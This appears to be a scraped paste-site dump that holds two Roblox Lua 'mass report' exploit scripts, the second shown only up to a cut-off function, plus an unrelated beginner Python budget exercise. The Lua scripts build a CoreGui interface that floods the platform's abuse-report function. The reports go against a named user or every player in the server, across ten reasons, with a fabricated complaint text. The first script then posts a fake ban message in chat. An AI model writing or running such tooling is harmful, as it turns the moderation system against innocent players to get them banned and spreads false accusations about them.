DelayBox.PlaceholderText = ""Delay""
DelayBox.Text = tostring(DELAY)
DelayBox.TextColor3 = Color3.fromRGB(255, 255, 255)
DelayBox.TextSize = 12
DelayBox.Parent = SettingsFrame

local DelayBoxCorner = Instance.new(""UICorner"")
DelayBoxCorner.CornerRadius = UDim.new(0, 4)
DelayBoxCorner.Parent = DelayBox

local DelayBoxPadding = Instance.new(""UIPadding"")
DelayBoxPadding.PaddingLeft = UDim.new(0, 8)
DelayBoxPadding.Parent = DelayBox

local AllReasonsCheck = Instance.new(""TextButton"")
AllReasonsCheck.Name = ""AllReasonsCheck""
AllReasonsCheck.Size = UDim2.new(1, -20, 0, 25)
AllReasonsCheck.Position = UDim2.new(0, 10, 0, 60)
AllReasonsCheck.BackgroundColor3 = Color3.fromRGB(40, 20, 20)
AllReasonsCheck.BackgroundTransparency = 0.4
AllReasonsCheck.BorderSizePixel = 0
AllReasonsCheck.Font = Enum.Font.GothamBold
AllReasonsCheck.Text = ""  ✓ All 10 Report Reasons""
AllReasonsCheck.TextColor3 = Color3.fromRGB(220, 20, 60)
AllReasonsCheck.TextSize = 13
AllReasonsCheck.TextXAlignment = Enum.TextXAlignment.Left
AllReasonsCheck.Parent = SettingsFrame

local CheckIcon = Instance.new(""ImageLabel"")
CheckIcon.Name = ""CheckIcon""
CheckIcon.Size = UDim2.new(0, 18, 0, 18)
CheckIcon.Position = UDim2.new(1, -22, 0, 3)
CheckIcon.BackgroundTransparency = 1
CheckIcon.Image = ""rbxassetid://3926305904""
CheckIcon.ImageColor3 = Color3.fromRGB(220, 20, 60)
CheckIcon.ImageRectOffset = Vector2.new(50, 50)
CheckIcon.ImageRectSize = Vector2.new(48, 48)
CheckIcon.Parent = AllReasonsCheck

local StartButton = Instance.new(""TextButton"")
StartButton.Name = ""StartButton""
StartButton.Size = UDim2.new(1, -20, 0, 45)
StartButton.Position = UDim2.new(0, 10, 0, 245)
StartButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
StartButton.BackgroundTransparency = 0.2
StartButton.BorderSizePixel = 0
StartButton.Font = Enum.Font.GothamBold
StartButton.Text = ""🔥 START MASS REPORT 🔥""
StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
StartButton.TextSize = 16
StartButton.Parent = MainFrame

local StartButtonCorner = Instance.new(""UICorner"")
StartButtonCorner.CornerRadius = UDim.new(0, 8)
StartButtonCorner.Parent = StartButton

local StartButtonStroke = Instance.new(""UIStroke"")
StartButtonStroke.Color = Color3.fromRGB(220, 20, 60)
StartButtonStroke.Thickness = 2
StartButtonStroke.Parent = StartButton

local ReportTypeFrame = Instance.new(""Frame"")
ReportTypeFrame.Name = ""ReportTypeFrame""
ReportTypeFrame.Size = UDim2.new(1, -20, 0, 85)
ReportTypeFrame.Position = UDim2.new(0, 10, 0, 295)
ReportTypeFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
ReportTypeFrame.BackgroundTransparency = 0.2
ReportTypeFrame.BorderSizePixel = 0
ReportTypeFrame.Parent = MainFrame

local ReportTypeCorner = Instance.new(""UICorner"")
ReportTypeCorner.CornerRadius = UDim.new(0, 8)
ReportTypeCorner.Parent = ReportTypeFrame

local ReportTypeStroke = Instance.new(""UIStroke"")
ReportTypeStroke.Color = Color3.fromRGB(220, 20, 60)
ReportTypeStroke.Thickness = 2
ReportTypeStroke.Parent = ReportTypeFrame

local ReportTypeLabel = Instance.new(""TextLabel"")
ReportTypeLabel.Name = ""ReportTypeLabel""
ReportTypeLabel.Size = UDim2.new(1, -20, 0, 18)
ReportTypeLabel.Position = UDim2.new(0, 10, 0, 5)
ReportTypeLabel.BackgroundTransparency = 1
ReportTypeLabel.Font = Enum.Font.GothamBold
ReportTypeLabel.Text = ""Report Type:""
ReportTypeLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
ReportTypeLabel.TextSize = 13
ReportTypeLabel.TextXAlignment = Enum.TextXAlignment.Left
ReportTypeLabel.Parent = ReportTypeFrame

local ReportTypeBox = Instance.new(""TextBox"")
ReportTypeBox.Name = ""ReportTypeBox""
ReportTypeBox.Size = UDim2.new(1, -20, 0, 30)
ReportTypeBox.Position = UDim2.new(0, 10, 0, 25)
ReportTypeBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
ReportTypeBox.BackgroundTransparency = 0.3
ReportTypeBox.BorderSizePixel = 0
ReportTypeBox.Font = Enum.Font.Gotham
ReportTypeBox.PlaceholderText = ""Text, Avatar, or VoiceChat""
ReportTypeBox.Text = ""Text""
ReportTypeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ReportTypeBox.TextSize = 12
ReportTypeBox.Parent = ReportTypeFrame

local ReportTypeBoxCorner = Instance.new(""UICorner"")
ReportTypeBoxCorner.CornerRadius = UDim.new(0, 4)
ReportTypeBoxCorner.Parent = ReportTypeBox

local ReportTypeBoxPadding = Instance.new(""UIPadding"")
ReportTypeBoxPadding.PaddingLeft = UDim.new(0, 8)
ReportTypeBoxPadding.Parent = ReportTypeBox

local WhitelistFrame = Instance.new(""Frame"")
WhitelistFrame.Name = ""WhitelistFrame""
WhitelistFrame.Size = UDim2.new(1, -20, 0, 85)
WhitelistFrame.Position = UDim2.new(0, 10, 0, 390)
WhitelistFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
WhitelistFrame.BackgroundTransparency = 0.2
WhitelistFrame.BorderSizePixel = 0
WhitelistFrame.Parent = MainFrame

local WhitelistCorner = Instance.new(""UICorner"")
WhitelistCorner.CornerRadius = UDim.new(0, 8)
WhitelistCorner.Parent = WhitelistFrame

local WhitelistStroke = Instance.new(""UIStroke"")
WhitelistStroke.Color = Color3.fromRGB(220, 20, 60)
WhitelistStroke.Thickness = 2
WhitelistStroke.Parent = WhitelistFrame

local WhitelistLabel = Instance.new(""TextLabel"")
WhitelistLabel.Name = ""WhitelistLabel""
WhitelistLabel.Size = UDim2.new(1, -20, 0, 18)
WhitelistLabel.Position = UDim2.new(0, 10, 0, 5)
WhitelistLabel.BackgroundTransparency = 1
WhitelistLabel.Font = Enum.Font.GothamBold
WhitelistLabel.Text = ""Whitelist (comma separated):""
WhitelistLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
WhitelistLabel.TextSize = 13
WhitelistLabel.TextXAlignment = Enum.TextXAlignment.Left
WhitelistLabel.Parent = WhitelistFrame

local WhitelistBox = Instance.new(""TextBox"")
WhitelistBox.Name = ""WhitelistBox""
WhitelistBox.Size = UDim2.new(1, -20, 0, 55)
WhitelistBox.Position = UDim2.new(0, 10, 0, 25)
WhitelistBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
WhitelistBox.BackgroundTransparency = 0.3
WhitelistBox.BorderSizePixel = 0
WhitelistBox.Font = Enum.Font.Gotham
WhitelistBox.PlaceholderText = ""username1, username2, username3""
WhitelistBox.Text = game.Players.LocalPlayer.Name
WhitelistBox.TextColor3 = Color3.fromRGB(255, 255, 255)
WhitelistBox.TextSize = 11
WhitelistBox.TextXAlignment = Enum.TextXAlignment.Left
WhitelistBox.TextYAlignment = Enum.TextYAlignment.Top
WhitelistBox.MultiLine = true
WhitelistBox.ClearTextOnFocus = false
WhitelistBox.Parent = WhitelistFrame

local WhitelistBoxCorner = Instance.new(""UICorner"")
WhitelistBoxCorner.CornerRadius = UDim.new(0, 4)
WhitelistBoxCorner.Parent = WhitelistBox

local WhitelistBoxPadding = Instance.new(""UIPadding"")
WhitelistBoxPadding.PaddingLeft = UDim.new(0, 8)
WhitelistBoxPadding.PaddingTop = UDim.new(0, 5)
WhitelistBoxPadding.Parent = WhitelistBox

local LogFrame = Instance.new(""Frame"")
LogFrame.Name = ""LogFrame""
LogFrame.Size = UDim2.new(1, -20, 1, -485)
LogFrame.Position = UDim2.new(0, 10, 0, 485)
LogFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
LogFrame.BackgroundTransparency = 0.3
LogFrame.BorderSizePixel = 0
LogFrame.Parent = MainFrame

local LogCorner = Instance.new(""UICorner"")
LogCorner.CornerRadius = UDim.new(0, 8)
LogCorner.Parent = LogFrame

local LogStroke = Instance.new(""UIStroke"")
LogStroke.Color = Color3.fromRGB(220, 20, 60)
LogStroke.Thickness = 1.5
LogStroke.Parent = LogFrame

local LogScroller = Instance.new(""ScrollingFrame"")
LogScroller.Name = ""LogScroller""
LogScroller.Size = UDim2.new(1, -8, 1, -8)
LogScroller.Position = UDim2.new(0, 4, 0, 4)
LogScroller.BackgroundTransparency = 1
LogScroller.BorderSizePixel = 0
LogScroller.ScrollBarThickness = 6
LogScroller.ScrollBarImageColor3 = Color3.fromRGB(220, 20, 60)
LogScroller.Parent = LogFrame

local LogLayout = Instance.new(""UIListLayout"")
LogLayout.Name = ""LogLayout""
LogLayout.Padding = UDim.new(0, 4)
LogLayout.SortOrder = Enum.SortOrder.LayoutOrder
LogLayout.Parent = LogScroller

local function AddLog(message, color)
    color = color or Color3.fromRGB(255, 255, 255)
    
    local LogEntry = Instance.new(""TextLabel"")
    LogEntry.Name = ""LogEntry""
    LogEntry.Size = UDim2.new(1, 0, 0, 18)
    LogEntry.BackgroundTransparency = 1
    LogEntry.Font = Enum.Font.Gotham
    LogEntry.Text = ""» ""..message
    LogEntry.TextColor3 = color
    LogEntry.TextSize = 12
    LogEntry.TextXAlignment = Enum.TextXAlignment.Left
    LogEntry.TextTruncate = Enum.TextTruncate.AtEnd
    LogEntry.Parent = LogScroller
    
    LogScroller.CanvasSize = UDim2.new(0, 0, 0, LogLayout.AbsoluteContentSize.Y)
    LogScroller.CanvasPosition = Vector2.new(0, LogScroller.CanvasSize.Y.Offset)
    
    return LogEntry
end

AddLog(""System ready. Enter data and click START."", Color3.fromRGB(220, 20, 60))

local function ButtonHoverEffect(button, defaultColor, hoverColor, transparency)
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor, BackgroundTransparency = transparency - 0.15}):Play()
    end)
    
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = defaultColor, BackgroundTransparency = transparency}):Play()
    end)
end

ButtonHoverEffect(StartButton, Color3.fromRGB(220, 20, 60), Color3.fromRGB(255, 50, 100), 0.2)
ButtonHoverEffect(CloseButton, Color3.fromRGB(255, 0, 0), Color3.fromRGB(255, 100, 100), 0.2)
ButtonHoverEffect(AllReasonsCheck, Color3.fromRGB(40, 20, 20), Color3.fromRGB(60, 30, 30), 0.4)

local dragging = false
local dragStart = nil
local startPos = nil

Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

Title.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging and dragStart then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale, 
            startPos.X.Offset + delta.X, 
            startPos.Y.Scale, 
            startPos.Y.Offset + delta.Y
        )
    end
end)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

local function AnnounceBan(playerName)
    local msg = playerName.."" has been banned from the game""
    
    pcall(function() game:GetService(""TextChatService"").TextChannels.RBXGeneral:SendAsync(msg) end)
    pcall(function() game:GetService(""ReplicatedStorage"").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, ""All"") end)
    pcall(function() game:GetService(""Players""):Chat(msg) end)
    AddLog(""BAN ANNOUNCED for ""..playerName, Color3.fromRGB(255, 100, 100))
end

local function MassReport()
    local targetInput = TargetBox.Text:lower():gsub(""%s+"", """")
    local reportsCount = tonumber(CountBox.Text) or REPORTS_PER_REASON
    local delay = tonumber(DelayBox.Text) or DELAY
    local reportType = ReportTypeBox.Text:gsub(""%s+"", """")
    
    -- Parse whitelist from GUI
    WHITELIST = {}
    for name in ReportTypeBox.Text:gmatch(""[^,]+"") do
        name = name:gsub(""^%s+"", """"):gsub(""%s+$"", """") -- trim spaces
        if name ~= """" then
            table.insert(WHITELIST, name)
        end
    end
    for name in WhitelistBox.Text:gmatch(""[^,]+"") do
        name = name:gsub(""^%s+"", """"):gsub(""%s+$"", """") -- trim spaces
        if name ~= """" then
            table.insert(WHITELIST, name)
        end
    end
    
    -- Validate report type
    local validReportType = false
    for _, rType in ipairs(REPORT_TYPES) do
        if reportType:lower() == rType:lower() then
            reportType = rType
            validReportType = true
            break
        end
    end
    
    if not validReportType then
        AddLog(""ERROR: Invalid report type! Use: Text, Avatar, or VoiceChat"", Color3.fromRGB(255, 100, 100))
        return
    end
    
    local targetsToReport = {}
    
    if targetInput == ""all"" then
        for _, player in ipairs(game:GetService(""Players""):GetPlayers()) do
            local isWhitelisted = false
            for _, whitelistedName in ipairs(WHITELIST) do
                if player.Name:lower() == whitelistedName:lower() then
                    isWhitelisted = true
                    break
                end
            end
            if not isWhitelisted then
                table.insert(targetsToReport, player)
                AddLog(""Added ""..player.Name.."" to report list"", Color3.fromRGB(255, 200, 100))
            end
        end
    else
        local targetPlayer = game:GetService(""Players""):FindFirstChild(targetInput)
        if not targetPlayer then
            AddLog(""ERROR: Player ""..targetInput.."" not found!"", Color3.fromRGB(255, 100, 100))
            return
        end
        
        local isWhitelisted = false
        for _, whitelistedName in ipairs(WHITELIST) do
            if targetPlayer.Name:lower() == whitelistedName:lower() then
                isWhitelisted = true
                break
            end
        end
        
        if isWhitelisted then
            AddLog(""ERROR: Player ""..targetInput.."" is whitelisted!"", Color3.fromRGB(255, 100, 100))
            return
        end
        
        table.insert(targetsToReport, targetPlayer)
    end
    
    if #targetsToReport == 0 then
        AddLog(""No targets to report!"", Color3.fromRGB(255, 100, 100))
        return
    end
    
    AddLog(""Starting mass report on ""..#targetsToReport.."" player(s) - Type: ""..reportType, Color3.fromRGB(100, 255, 100))
    
    for _, targetPlayer in ipairs(targetsToReport) do
        for _, reason in ipairs(REASONS) do
            for i = 1, reportsCount do
                if not targetPlayer.Parent then break end 
                
                pcall(function()
                    game:GetService(""Players"").ReportAbuse(
                        game.Players.LocalPlayer,
                        targetPlayer,
                        reason,
                        ""The player is using an inappropriate avatar and engaging in conversations involving dating, sexual content, and vulgar language. Such behavior is impolite and violates the rules. Please take action and consider banning the account. The player is being toxic by using abusive and offensive language to insult and attack other people. This behavior is disrespectful and violates the rules. Please take action against this user.""
                    )
                    AddLog(""[""..reportType..""] Report [""..targetPlayer.Name..""] - ""..reason.."" (""..i..""/""..reportsCount.."")"")
                end)
                
                task.wait(delay)
            end
        end
        AnnounceBan(targetPlayer.Name)
    end
    
    AddLog(""Mass report completed!"", Color3.fromRGB(100, 255, 100))
end

StartButton.MouseButton1Click:Connect(function()
    StartButton.Text = ""PROCESSING...""
    StartButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    
    coroutine.wrap(function()
        MassReport()
        
        StartButton.Text = ""🔥 START MASS REPORT 🔥""
        StartButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
    end)()
end)

local CreatorLabel = Instance.new(""TextLabel"")
CreatorLabel.Name = ""CreatorLabel""
CreatorLabel.Size = UDim2.new(1, -20, 0, 18)
CreatorLabel.Position = UDim2.new(0, 10, 1, -22)
CreatorLabel.BackgroundTransparency = 1
CreatorLabel.Font = Enum.Font.Gotham
CreatorLabel.Text = ""Created by: @Albonbv | v2.0 | Recoded By Sinnerman""
CreatorLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
CreatorLabel.TextSize = 11
CreatorLabel.TextXAlignment = Enum.TextXAlignment.Right
CreatorLabel.Parent = MainFrame"
2qRrzyut,Python Godzilla_vs_Kong Не е решена,MladenKarachanov,Python,Saturday 18th of October 2025 06:25:43 PM CDT,"budget = float(input())
numstatist = int(input())
price_clothing = float(input())

discount = 0
dekor = budget * 10 / 100
price_statist = numstatist * price_clothing

#total_sum = dekor + price_statist

if numstatist > 150:
    price_statist = price_statist * 0.90
    total_sum = price_statist + dekor
    diff = abs(budget - total_sum)
    if budget < total_sum:
        #diff = abs(budget - total_sum)
        print(""Not enough money!"")
        print(f""Wingard needs {diff:.2f} leva more."")
    else:
        #result = abs(budget - total_sum)
        print(""Action!"")
        print(f""Wingard starts filming with {diff:.2f} leva left."")
        
        #Не е решена"
ZZPJMur6,"Universal: Auto Report, Single Report",lcr999x,Lua,Saturday 18th of October 2025 06:20:52 PM CDT,"local UserInputService = game:GetService(""UserInputService"")
local TweenService = game:GetService(""TweenService"")

local TARGET = ""g0dhatesus""
local REPORTS_PER_REASON = 1500000
local DELAY = 0.001

local REASONS = {
    ""Cheating"",
    ""Exploiting"",
    ""Scamming"",
    ""Harassment"",
    ""Swearing"",
    ""Bullying"",
    ""InappropriateContent"",
    ""PersonalInfo"",
    ""Dating"",
    ""Phishing""
}

local ScreenGui = Instance.new(""ScreenGui"")
ScreenGui.Name = ""MassReportGUI""
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService(""CoreGui"")

local MainFrame = Instance.new(""Frame"")
MainFrame.Name = ""MainFrame""
MainFrame.Size = UDim2.new(0, 380, 0, 450)
MainFrame.Position = UDim2.new(0.5, -190, 0.5, 50)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
MainFrame.BackgroundTransparency = 0.1
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

local UICorner = Instance.new(""UICorner"")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = MainFrame

local UIStroke = Instance.new(""UIStroke"")
UIStroke.Color = Color3.fromRGB(220, 20, 60)
UIStroke.Thickness = 3
UIStroke.Parent = MainFrame

local DropShadow = Instance.new(""ImageLabel"")
DropShadow.Name = ""DropShadow""
DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DropShadow.BackgroundTransparency = 1
DropShadow.BorderSizePixel = 0
DropShadow.Position = UDim2.new(0.5, 0, 0.5, 6)
DropShadow.Size = UDim2.new(1, 15, 1, 15)
DropShadow.Image = ""rbxassetid://1316045217""
DropShadow.ImageColor3 = Color3.fromRGB(220, 20, 60)
DropShadow.ImageTransparency = 0.7
DropShadow.ScaleType = Enum.ScaleType.Slice
DropShadow.SliceCenter = Rect.new(10, 10, 118, 118)
DropShadow.Parent = MainFrame

local Title = Instance.new(""TextLabel"")
Title.Name = ""Title""
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
Title.BackgroundTransparency = 0
Title.BorderSizePixel = 0
Title.Font = Enum.Font.GothamBold
Title.Text = ""⚔ SINGLE REPORT v2.0 ⚔""
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 20
Title.TextXAlignment = Enum.TextXAlignment.Center
Title.Parent = MainFrame

local TitleCorner = Instance.new(""UICorner"")
TitleCorner.CornerRadius = UDim.new(0, 12)
TitleCorner.Parent = Title

local CloseButton = Instance.new(""TextButton"")
CloseButton.Name = ""CloseButton""
CloseButton.Size = UDim2.new(0, 35, 0, 35)
CloseButton.Position = UDim2.new(1, -40, 0, 7)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.BackgroundTransparency = 0.2
CloseButton.BorderSizePixel = 0
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Text = ""✕""
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 18
CloseButton.Parent = Title

local CloseButtonCorner = Instance.new(""UICorner"")
CloseButtonCorner.CornerRadius = UDim.new(0, 6)
CloseButtonCorner.Parent = CloseButton

local TargetFrame = Instance.new(""Frame"")
TargetFrame.Name = ""TargetFrame""
TargetFrame.Size = UDim2.new(1, -20, 0, 70)
TargetFrame.Position = UDim2.new(0, 10, 0, 60)
TargetFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
TargetFrame.BackgroundTransparency = 0.2
TargetFrame.BorderSizePixel = 0
TargetFrame.Parent = MainFrame

local TargetCorner = Instance.new(""UICorner"")
TargetCorner.CornerRadius = UDim.new(0, 8)
TargetCorner.Parent = TargetFrame

local TargetStroke = Instance.new(""UIStroke"")
TargetStroke.Color = Color3.fromRGB(220, 20, 60)
TargetStroke.Thickness = 2
TargetStroke.Parent = TargetFrame

local TargetLabel = Instance.new(""TextLabel"")
TargetLabel.Name = ""TargetLabel""
TargetLabel.Size = UDim2.new(1, -20, 0, 20)
TargetLabel.Position = UDim2.new(0, 10, 0, 5)
TargetLabel.BackgroundTransparency = 1
TargetLabel.Font = Enum.Font.GothamBold
TargetLabel.Text = ""🎯 Target Username:""
TargetLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
TargetLabel.TextSize = 14
TargetLabel.TextXAlignment = Enum.TextXAlignment.Left
TargetLabel.Parent = TargetFrame

local TargetBox = Instance.new(""TextBox"")
TargetBox.Name = ""TargetBox""
TargetBox.Size = UDim2.new(1, -20, 0, 35)
TargetBox.Position = UDim2.new(0, 10, 0, 28)
TargetBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
TargetBox.BackgroundTransparency = 0.3
TargetBox.BorderSizePixel = 0
TargetBox.Font = Enum.Font.Gotham
TargetBox.PlaceholderText = ""Enter username here...""
TargetBox.Text = TARGET
TargetBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TargetBox.TextSize = 14
TargetBox.TextXAlignment = Enum.TextXAlignment.Left
TargetBox.Parent = TargetFrame

local TargetBoxCorner = Instance.new(""UICorner"")
TargetBoxCorner.CornerRadius = UDim.new(0, 5)
TargetBoxCorner.Parent = TargetBox

local TargetBoxPadding = Instance.new(""UIPadding"")
TargetBoxPadding.PaddingLeft = UDim.new(0, 10)
TargetBoxPadding.Parent = TargetBox

local SettingsFrame = Instance.new(""Frame"")
SettingsFrame.Name = ""SettingsFrame""
SettingsFrame.Size = UDim2.new(1, -20, 0, 95)
SettingsFrame.Position = UDim2.new(0, 10, 0, 140)
SettingsFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
SettingsFrame.BackgroundTransparency = 0.2
SettingsFrame.BorderSizePixel = 0
SettingsFrame.Parent = MainFrame

local SettingsCorner = Instance.new(""UICorner"")
SettingsCorner.CornerRadius = UDim.new(0, 8)
SettingsCorner.Parent = SettingsFrame

local SettingsStroke = Instance.new(""UIStroke"")
SettingsStroke.Color = Color3.fromRGB(220, 20, 60)
SettingsStroke.Thickness = 2
SettingsStroke.Parent = SettingsFrame

local CountLabel = Instance.new(""TextLabel"")
CountLabel.Name = ""CountLabel""
CountLabel.Size = UDim2.new(0.5, -10, 0, 18)
CountLabel.Position = UDim2.new(0, 10, 0, 5)
CountLabel.BackgroundTransparency = 1
CountLabel.Font = Enum.Font.GothamBold
CountLabel.Text = ""Reports per Reason:""
CountLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
CountLabel.TextSize = 12
CountLabel.TextXAlignment = Enum.TextXAlignment.Left
CountLabel.Parent = SettingsFrame

local CountBox = Instance.new(""TextBox"")
CountBox.Name = ""CountBox""
CountBox.Size = UDim2.new(0.5, -15, 0, 28)
CountBox.Position = UDim2.new(0, 10, 0, 25)
CountBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
CountBox.BackgroundTransparency = 0.3
CountBox.BorderSizePixel = 0
CountBox.Font = Enum.Font.Gotham
CountBox.PlaceholderText = ""Count""
CountBox.Text = tostring(REPORTS_PER_REASON)
CountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
CountBox.TextSize = 12
CountBox.Parent = SettingsFrame

local CountBoxCorner = Instance.new(""UICorner"")
CountBoxCorner.CornerRadius = UDim.new(0, 4)
CountBoxCorner.Parent = CountBox

local CountBoxPadding = Instance.new(""UIPadding"")
CountBoxPadding.PaddingLeft = UDim.new(0, 8)
CountBoxPadding.Parent = CountBox

local DelayLabel = Instance.new(""TextLabel"")
DelayLabel.Name = ""DelayLabel""
DelayLabel.Size = UDim2.new(0.5, -10, 0, 18)
DelayLabel.Position = UDim2.new(0.5, 5, 0, 5)
DelayLabel.BackgroundTransparency = 1
DelayLabel.Font = Enum.Font.GothamBold
DelayLabel.Text = ""Delay (seconds):""
DelayLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
DelayLabel.TextSize = 12
DelayLabel.TextXAlignment = Enum.TextXAlignment.Left
DelayLabel.Parent = SettingsFrame

local DelayBox = Instance.new(""TextBox"")
DelayBox.Name = ""DelayBox""
DelayBox.Size = UDim2.new(0.5, -15, 0, 28)
DelayBox.Position = UDim2.new(0.5, 5, 0, 25)
DelayBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
DelayBox.BackgroundTransparency = 0.3
DelayBox.BorderSizePixel = 0
DelayBox.Font = Enum.Font.Gotham
DelayBox.PlaceholderText = ""Delay""
DelayBox.Text = tostring(DELAY)
DelayBox.TextColor3 = Color3.fromRGB(255, 255, 255)
DelayBox.TextSize = 12
DelayBox.Parent = SettingsFrame

local DelayBoxCorner = Instance.new(""UICorner"")
DelayBoxCorner.CornerRadius = UDim.new(0, 4)
DelayBoxCorner.Parent = DelayBox

local DelayBoxPadding = Instance.new(""UIPadding"")
DelayBoxPadding.PaddingLeft = UDim.new(0, 8)
DelayBoxPadding.Parent = DelayBox

local AllReasonsCheck = Instance.new(""TextButton"")
AllReasonsCheck.Name = ""AllReasonsCheck""
AllReasonsCheck.Size = UDim2.new(1, -20, 0, 25)
AllReasonsCheck.Position = UDim2.new(0, 10, 0, 60)
AllReasonsCheck.BackgroundColor3 = Color3.fromRGB(40, 20, 20)
AllReasonsCheck.BackgroundTransparency = 0.4
AllReasonsCheck.BorderSizePixel = 0
AllReasonsCheck.Font = Enum.Font.GothamBold
AllReasonsCheck.Text = ""  ✓ All 10 Report Reasons""
AllReasonsCheck.TextColor3 = Color3.fromRGB(220, 20, 60)
AllReasonsCheck.TextSize = 13
AllReasonsCheck.TextXAlignment = Enum.TextXAlignment.Left
AllReasonsCheck.Parent = SettingsFrame

local CheckIcon = Instance.new(""ImageLabel"")
CheckIcon.Name = ""CheckIcon""
CheckIcon.Size = UDim2.new(0, 18, 0, 18)
CheckIcon.Position = UDim2.new(1, -22, 0, 3)
CheckIcon.BackgroundTransparency = 1
CheckIcon.Image = ""rbxassetid://3926305904""
CheckIcon.ImageColor3 = Color3.fromRGB(220, 20, 60)
CheckIcon.ImageRectOffset = Vector2.new(50, 50)
CheckIcon.ImageRectSize = Vector2.new(48, 48)
CheckIcon.Parent = AllReasonsCheck

local StartButton = Instance.new(""TextButton"")
StartButton.Name = ""StartButton""
StartButton.Size = UDim2.new(1, -20, 0, 45)
StartButton.Position = UDim2.new(0, 10, 0, 245)
StartButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
StartButton.BackgroundTransparency = 0.2
StartButton.BorderSizePixel = 0
StartButton.Font = Enum.Font.GothamBold
StartButton.Text = ""🔥 START REPORT 🔥""
StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
StartButton.TextSize = 16
StartButton.Parent = MainFrame

local StartButtonCorner = Instance.new(""UICorner"")
StartButtonCorner.CornerRadius = UDim.new(0, 8)
StartButtonCorner.Parent = StartButton

local StartButtonStroke = Instance.new(""UIStroke"")
StartButtonStroke.Color = Color3.fromRGB(220, 20, 60)
StartButtonStroke.Thickness = 2
StartButtonStroke.Parent = StartButton

local LogFrame = Instance.new(""Frame"")
LogFrame.Name = ""LogFrame""
LogFrame.Size = UDim2.new(1, -20, 1, -305)
LogFrame.Position = UDim2.new(0, 10, 0, 300)
LogFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
LogFrame.BackgroundTransparency = 0.3
LogFrame.BorderSizePixel = 0
LogFrame.Parent = MainFrame

local LogCorner = Instance.new(""UICorner"")
LogCorner.CornerRadius = UDim.new(0, 8)
LogCorner.Parent = LogFrame

local LogStroke = Instance.new(""UIStroke"")
LogStroke.Color = Color3.fromRGB(220, 20, 60)
LogStroke.Thickness = 1.5
LogStroke.Parent = LogFrame

local LogScroller = Instance.new(""ScrollingFrame"")
LogScroller.Name = ""LogScroller""
LogScroller.Size = UDim2.new(1, -8, 1, -8)
LogScroller.Position = UDim2.new(0, 4, 0, 4)
LogScroller.BackgroundTransparency = 1
LogScroller.BorderSizePixel = 0
LogScroller.ScrollBarThickness = 6
LogScroller.ScrollBarImageColor3 = Color3.fromRGB(220, 20, 60)
LogScroller.Parent = LogFrame

local LogLayout = Instance.new(""UIListLayout"")
LogLayout.Name = ""LogLayout""
LogLayout.Padding = UDim.new(0, 4)
LogLayout.SortOrder = Enum.SortOrder.LayoutOrder
LogLayout.Parent = LogScroller

local function AddLog(message, color)
    color = color or Color3.fromRGB(255, 255, 255)
    
    local LogEntry = Instance.new(""TextLabel"")
    LogEntry.Name = ""LogEntry""
    LogEntry.Size = UDim2.new(1, 0, 0, 18)
    LogEntry.BackgroundTransparency = 1
    LogEntry.Font = Enum.Font.Gotham
    LogEntry.Text = ""» ""..message
    LogEntry.TextColor3 = color
    LogEntry.TextSize = 12
    LogEntry.TextXAlignment = Enum.TextXAlignment.Left
    LogEntry.TextTruncate = Enum.TextTruncate.AtEnd
    LogEntry.Parent = LogScroller
    
    LogScroller.CanvasSize = UDim2.new(0, 0, 0, LogLayout.AbsoluteContentSize.Y)
    LogScroller.CanvasPosition = Vector2.new(0, LogScroller.CanvasSize.Y.Offset)
    
    return LogEntry
end

AddLog(""System ready. Enter data and click START."", Color3.fromRGB(220, 20, 60))

local function ButtonHoverEffect(button, defaultColor, hoverColor, transparency)
